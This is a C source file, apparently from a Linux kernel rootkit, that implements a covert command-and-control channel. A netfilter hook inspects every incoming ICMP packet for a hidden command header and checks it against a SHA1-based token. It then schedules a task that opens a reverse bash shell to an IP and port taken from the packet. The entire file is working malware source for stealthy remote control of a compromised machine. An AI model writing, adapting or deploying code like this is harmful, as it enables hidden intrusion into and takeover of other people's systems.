#include "c2.h"
#include "rshell.h"
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/icmp.h>
#include <linux/ip.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/crypto.h>
#include <linux/scatterlist.h>

#define SHA1_LENGTH     20
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20)
    #define R_INIT_WORK(_t, _f) INIT_WORK((_t), (void (*)(void *))(_f), (_t))
#else
    #define R_INIT_WORK(_t, _f) INIT_WORK((_t), (_f))
#endif

struct workqueue_struct *work_queue;

struct c2_task {
    struct work_struct work;
    struct c2hdr header;
    struct c2opt_gen payload;
    __u32 dst_ip;
};

typedef void (*command_ptr_t)(struct c2opt_gen);

void do_reverse_shell(struct c2opt_gen payload)
{
    __u32 port = ntohl(payload.field2);
    __u32 ip = payload.field1;
    try_reverse_shell_bash(ip, port);
    //try_reverse_shell_nc(payload);
}

command_ptr_t cmd_table[CMD_MAX] = {
    [CMD_REVERSE_SHELL] = do_reverse_shell,
};

static int new_sha1(__u8 *buf, __u8 *output)
{
    struct scatterlist sg;
    struct crypto_hash *tfm;
    struct hash_desc desc;

    tfm = crypto_alloc_hash("sha1", 0, CRYPTO_ALG_ASYNC);

    desc.tfm = tfm;
    desc.flags = 0;

    sg_init_one(&sg, buf, 12);
    crypto_hash_init(&desc);

    crypto_hash_update(&desc, &sg, 12);
    crypto_hash_final(&desc, output);

    crypto_free_hash(tfm);

    return 0;
}

int check_auth(struct c2hdr header, struct c2opt_gen payload, __u32 ip)
{
    __u8 auth_sha1[SHA1_LENGTH] = {0};
    __u8 auth_data[sizeof(struct c2opt_gen) + sizeof(__u32)] = {0};

    memcpy(auth_data, &payload, sizeof(payload));
    memcpy(auth_data + sizeof(payload), &ip, sizeof(ip));

    new_sha1(auth_data, auth_sha1);

    return !memcmp(auth_sha1, header.nonce, sizeof(header.nonce));
}


static void exec_c2_task(struct work_struct *work)
{
    struct c2_task *task = (struct c2_task *)work;

    if (check_auth(task->header, task->payload, task->dst_ip)) {
        cmd_table[ntohl(task->header.cmd)](task->payload);
    }

    kfree(task);
    return;
}

static int queue_c2_task(void *hdr, void* payload, __u32 dst_ip)
{
    struct c2_task *task = NULL;
    int err = -ENOMEM;
    
    task = kmalloc(sizeof(*task), GFP_ATOMIC);
    if (task) {
        R_INIT_WORK(&task->work, &exec_c2_task);

        task->header = *(struct c2hdr *)hdr;
        task->payload = *(struct c2opt_gen *)payload;
        task->dst_ip = dst_ip;

        err = schedule_work(&task->work);
    }

    return err;
}

unsigned int watch_icmp(unsigned int hooknum,
                        struct sk_buff *skb,
                        const struct net_device *in,
                        const struct net_device *out,
                        int (*okfn)(struct sk_buff *))
{
    struct iphdr *ip_header = NULL;
    struct icmphdr *icmp_header = NULL;
    struct c2hdr *c2_header = NULL;
    struct c2opt_gen *payload = NULL;

    ip_header = ip_hdr(skb);
    if (!ip_header) {
        return NF_ACCEPT;
    }

    if (ip_header->protocol != IPPROTO_ICMP) {
        return NF_ACCEPT;
    }

    // skb->transport_header hasn't been set by this point, so we have to calculate it manually
    icmp_header = (struct icmphdr *)(ip_header + 1);
    if (!icmp_header) {
        return NF_ACCEPT;
    }

    c2_header = (struct c2hdr *)(icmp_header + 1);
    if (!c2_header) {
        return NF_ACCEPT;
    }

    if (ntohl(c2_header->cmd) < CMD_REVERSE_SHELL ||
        ntohl(c2_header->cmd) > CMD_MAX) {
        return NF_ACCEPT;
    }

    payload = (struct c2opt_gen *)(c2_header + 1);
    if (!payload) {
        return NF_ACCEPT;
    }
    queue_c2_task(c2_header, payload, ip_header->daddr);

    return NF_ACCEPT;
}

static struct nf_hook_ops c2_hook __read_mostly = {
    .hook     = watch_icmp,
    .owner    = THIS_MODULE,
    .pf       = PF_INET,
    .priority = NF_IP_PRI_FIRST,
    .hooknum  = NF_INET_PRE_ROUTING,
};


void c2_init(void)
{
    nf_register_hook(&c2_hook);
}

void c2_exit(void)
{
    flush_scheduled_work();
    nf_unregister_hook(&c2_hook);
}
